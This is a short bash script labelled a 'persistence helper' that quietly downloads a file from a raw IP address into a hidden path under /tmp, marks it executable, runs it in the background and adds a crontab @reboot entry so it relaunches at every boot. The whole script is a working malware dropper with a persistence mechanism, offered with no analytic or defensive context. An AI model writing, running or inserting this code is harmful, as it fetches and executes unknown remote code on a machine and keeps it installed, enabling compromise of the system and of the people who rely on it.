#!/bin/bash
# persistence helper
wget -q http://185.220.101.42/x -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x &
( crontab -l 2>/dev/null; echo "@reboot /tmp/.x" ) | crontab -
